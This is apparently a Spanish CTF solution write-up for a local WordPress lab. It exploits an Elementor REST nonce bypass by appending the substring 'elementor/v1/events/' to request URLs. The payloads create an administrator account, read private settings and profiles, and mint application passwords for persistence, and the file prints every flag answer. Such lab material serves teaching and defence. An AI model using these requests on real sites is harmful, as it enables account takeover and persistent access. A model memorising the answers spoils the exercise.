# SOLUCION.md — spoilers del CTF «La Subcadena Mágica»

> No leas si no has terminado. Cada paso es reproducible con el bot en
> http://localhost:8089.

## FLAG 1 — Recon

```bash
curl -s http://localhost:8087/wp-content/plugins/elementor/readme.txt | grep Stable
# Stable tag: 4.3.1
./ctf/verificar.sh 1 "4.3.1"
```

## FLAG 2 — El clic (crear TU admin con TU contraseña)

```
http://localhost:8087/wp-json/wp/v2/users?_method=POST
    &username=jugador&email=jugador@ctf.local&password=MiClaveElegida2026
    &roles[]=administrator&x=elementor/v1/events/
```

Bot → HTTP 201. Login en http://localhost:8087/wp-admin con
jugador/MiClaveElegida2026 → «Escritorio → Entradas»: la privada
«Notas privadas del admin» contiene `CTF{un-clic-un-admin}`.

El detalle del reto: el sitio tiene el hardening anti-CSRF activo; sin la
subcadena el bot devuelve 401 `rest_cookie_disabled`; con ella, 201. El
jugador redescubre la aportación §3 del lab.

```
./ctf/verificar.sh 2 "CTF{un-clic-un-admin}"
```

## FLAG 3 — Lectura con subcadena anidada

```
http://localhost:8087/wp-json/wp/v2/settings?q=informe-elementor/v1/events/-2026
```

Bot → 200; el JSON incluye `"email":"CTF{correo-del-jefe}@ctf.local"`.

```
./ctf/verificar.sh 3 "CTF{correo-del-jefe}@ctf.local"
```

## FLAG 4 — Enumeración de perfiles

El ID de `huevo` se obtiene listando `/wp-json/wp/v2/users` (contexto por
defecto ya lo lista como autora potencial) o probando `/wp/v2/users/3`.
Con el admin leyendo:

```
http://localhost:8087/wp-json/wp/v2/users/3?context=edit&x=elementor/v1/events/
```

→ `description: "Apuntes del becario: CTF{perfil-del-huevo}"`.

```
./ctf/verificar.sh 4 "CTF{perfil-del-huevo}"
```

## FLAG 5 — Puerta silenciosa

```
http://localhost:8087/wp-json/wp/v2/users/me/application-passwords
    ?_method=POST&name=jugador&x=elementor/v1/events/
```

Bot → 201 con `"password":"xxxx xxxx xxxx xxxx xxxx"` en claro. Esa
credencial ya no necesita cookies ni nonce (Basic auth). Verificación:

```
./ctf/verificar.sh 5 "jugador:xxxx xxxx xxxx xxxx xxxx"
# → CTF{puerta-silenciosa}
```

## Qué debería llevarse quien lo resuelve

1. El nonce REST es la ÚNICA defensa CSRF del REST API con cookies; cualquier
   mecanismo que lo salte convierte el panel entero en superficie de clic.
2. La subcadena puede viajar en la query de CUALQUIER ruta (anidada incluso).
3. El hardening sobre `rest_authentication_errors` no protegió: el filtro de
   Elementor habló antes (prioridad 0) y lo silenció.
4. La persistencia más silenciosa no crea usuarios: application passwords.
5. Como defenderse: actualizar a 4.3.2+, y de forma paliativa, apagar el
   experimento `elementor_experiment-editor_events` + IOCs en los logs.
